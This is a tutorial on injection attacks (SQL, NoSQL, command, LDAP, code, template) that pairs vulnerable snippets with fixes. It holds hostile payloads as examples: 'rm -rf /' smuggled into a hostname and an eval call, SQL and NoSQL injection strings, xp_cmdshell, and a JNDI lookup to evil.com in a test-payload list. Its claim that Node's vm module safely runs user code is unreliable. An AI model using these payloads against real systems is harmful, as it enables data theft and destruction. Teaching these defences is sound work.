# Injection Attacks

## 📚 Overview

Injection attacks occur when untrusted data is sent to an interpreter as part of a command or query. Attackers can trick the interpreter into executing unintended commands or accessing unauthorized data. Injection flaws are among the most critical and common web application vulnerabilities.

## 🎯 What are Injection Attacks?

Injection attacks happen when an application sends untrusted data to an interpreter. The attacker's malicious data tricks the interpreter into executing unintended commands or accessing data without proper authorization.

### Common Injection Types

1. **SQL Injection**: Database query manipulation
2. **NoSQL Injection**: NoSQL database manipulation
3. **Command Injection**: Operating system command execution
4. **LDAP Injection**: Directory service manipulation
5. **XPath Injection**: XML path manipulation
6. **Code Injection**: Application code execution
7. **Template Injection**: Template engine manipulation

## 🔍 SQL Injection

### How SQL Injection Works

SQL injection occurs when user input is directly concatenated into SQL queries:

```javascript
// VULNERABLE CODE
const query = `SELECT * FROM users WHERE username = '${username}' AND password = '${password}'`;
db.query(query);

// Attack example:
// username: admin' OR '1'='1
// password: anything
// Result: SELECT * FROM users WHERE username = 'admin' OR '1'='1' AND password = 'anything'
```

### SQL Injection Examples

#### Basic SQL Injection

```sql
-- Attack payload
' OR '1'='1
-- Results in: WHERE username = '' OR '1'='1'
```

#### Union-Based SQL Injection

```sql
-- Attack payload
' UNION SELECT username, password FROM users--
-- Retrieves all usernames and passwords
```

#### Blind SQL Injection

```sql
-- Time-based blind injection
' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE id=1)='a' AND SLEEP(5)--
-- If password starts with 'a', response is delayed by 5 seconds
```

### Prevention: Parameterized Queries

```javascript
// SECURE CODE - Parameterized queries
const query = 'SELECT * FROM users WHERE username = ? AND password = ?';
db.query(query, [username, password]);

// Using ORM (Sequelize)
const user = await User.findOne({
  where: {
    username: username,
    password: password
  }
});
```

### Prevention: Input Validation

```javascript
// SECURE CODE - Input validation
function validateUsername(username) {
  // Allow only alphanumeric and underscore, 3-20 characters
  const pattern = /^[a-zA-Z0-9_]{3,20}$/;
  if (!pattern.test(username)) {
    throw new Error('Invalid username format');
  }
  return username;
}

const safeUsername = validateUsername(username);
```

## 🔍 NoSQL Injection

### How NoSQL Injection Works

NoSQL databases use different query syntax, but injection is still possible:

```javascript
// VULNERABLE CODE
const query = {
  username: req.body.username,
  password: req.body.password
};
User.findOne(query);

// Attack example:
// username: admin
// password: { $ne: null }
// Result: Matches any user where password is not null
```

### NoSQL Injection Prevention

```javascript
// SECURE CODE - Input validation and sanitization
function sanitizeNoSQLInput(input) {
  if (typeof input === 'string') {
    return input.replace(/[$<>]/g, '');
  }
  if (typeof input === 'object') {
    throw new Error('Objects not allowed in user input');
  }
  return input;
}

const safeQuery = {
  username: sanitizeNoSQLInput(req.body.username),
  password: sanitizeNoSQLInput(req.body.password)
};
```

## 🔍 Command Injection

### How Command Injection Works

Command injection occurs when user input is used in system commands:

```javascript
// VULNERABLE CODE
const command = `ping ${req.body.hostname}`;
exec(command);

// Attack example:
// hostname: 8.8.8.8; rm -rf /
// Result: Executes ping and then deletes all files
```

### Command Injection Prevention

```javascript
// SECURE CODE - Whitelist validation
function validateHostname(hostname) {
  // Only allow IP addresses or valid domain names
  const ipPattern = /^(\d{1,3}\.){3}\d{1,3}$/;
  const domainPattern = /^[a-zA-Z0-9]([a-zA-Z0-9\-]{0,61}[a-zA-Z0-9])?(\.[a-zA-Z0-9]([a-zA-Z0-9\-]{0,61}[a-zA-Z0-9])?)*$/;
  
  if (!ipPattern.test(hostname) && !domainPattern.test(hostname)) {
    throw new Error('Invalid hostname');
  }
  return hostname;
}

// Use parameterized execution
const { execFile } = require('child_process');
execFile('ping', ['-c', '4', validateHostname(req.body.hostname)]);
```

## 🔍 LDAP Injection

### How LDAP Injection Works

LDAP injection occurs when user input is used in LDAP queries:

```javascript
// VULNERABLE CODE
const filter = `(cn=${username})`;
ldap.search(filter);

// Attack example:
// username: admin)(|(cn=*
// Result: Matches all entries
```

### LDAP Injection Prevention

```javascript
// SECURE CODE - LDAP escaping
function escapeLDAPFilter(filter) {
  return filter.replace(/[\\*()|&]/g, (char) => {
    return '\\' + char.charCodeAt(0).toString(16);
  });
}

const safeFilter = `(cn=${escapeLDAPFilter(username)})`;
```

## 🔍 Code Injection

### How Code Injection Works

Code injection occurs when user input is evaluated as code:

```javascript
// VULNERABLE CODE
eval(req.body.code);

// Attack example:
// code: require('child_process').exec('rm -rf /')
// Result: Executes malicious code
```

### Code Injection Prevention

```javascript
// SECURE CODE - Never use eval or similar
// Use safe alternatives
const vm = require('vm');
const context = {
  // Only provide safe objects
  Math: Math,
  Date: Date
};
vm.createContext(context);
vm.runInContext(req.body.code, context, { timeout: 1000 });
```

## 🛡️ General Prevention Strategies

### 1. Input Validation

```javascript
function validateInput(input, type, constraints) {
  // Type checking
  if (typeof input !== type) {
    throw new Error(`Expected ${type}, got ${typeof input}`);
  }
  
  // Constraint validation
  if (constraints.minLength && input.length < constraints.minLength) {
    throw new Error(`Input too short`);
  }
  
  if (constraints.maxLength && input.length > constraints.maxLength) {
    throw new Error(`Input too long`);
  }
  
  if (constraints.pattern && !constraints.pattern.test(input)) {
    throw new Error(`Input doesn't match required pattern`);
  }
  
  return input;
}
```

### 2. Output Encoding

```javascript
function encodeForContext(input, context) {
  switch (context) {
    case 'html':
      return input.replace(/[&<>"']/g, (char) => {
        const map = {
          '&': '&amp;',
          '<': '&lt;',
          '>': '&gt;',
          '"': '&quot;',
          "'": '&#x27;'
        };
        return map[char];
      });
    
    case 'javascript':
      return input.replace(/[\\'"]/g, '\\$&');
    
    case 'sql':
      return input.replace(/'/g, "''");
    
    default:
      return input;
  }
}
```

### 3. Least Privilege

```javascript
// Use database accounts with minimal privileges
const dbConfig = {
  user: 'app_user', // Not admin
  password: 'secure_password',
  database: 'app_db',
  // Only SELECT, INSERT, UPDATE on specific tables
  // No DROP, DELETE, or ALTER privileges
};
```

### 4. Prepared Statements

```javascript
// Always use prepared statements
const stmt = db.prepare('SELECT * FROM users WHERE username = ? AND password = ?');
const result = stmt.execute([username, password]);
```

## 📊 Testing for Injection Vulnerabilities

### Manual Testing

```javascript
// Test payloads
const testPayloads = [
  "' OR '1'='1",
  "'; DROP TABLE users--",
  "' UNION SELECT * FROM users--",
  "'; EXEC xp_cmdshell('dir')--",
  "${jndi:ldap://evil.com/a}",
  "{{7*7}}",
  "<%= 7*7 %>"
];

// Test each payload
for (const payload of testPayloads) {
  testInjection(payload);
}
```

### Automated Testing

```javascript
// Use security testing tools
// OWASP ZAP, Burp Suite, SQLMap
// Integrate into CI/CD pipeline
```

## 🎯 Best Practices

1. **Never Trust Input**: Always validate and sanitize
2. **Use Parameterized Queries**: Prevent SQL injection
3. **Least Privilege**: Minimal database permissions
4. **Input Validation**: Whitelist approach
5. **Output Encoding**: Context-appropriate encoding
6. **Error Handling**: Don't expose database structure
7. **Regular Updates**: Keep dependencies updated

## 🎓 Learning Resources

- OWASP Injection: https://owasp.org/www-community/Injection_Flaws
- SQL Injection Prevention: https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html
- Command Injection: https://owasp.org/www-community/attacks/Command_Injection

---

**Next**: Learn about [Broken Authentication](./BROKEN-AUTHENTICATION.md)

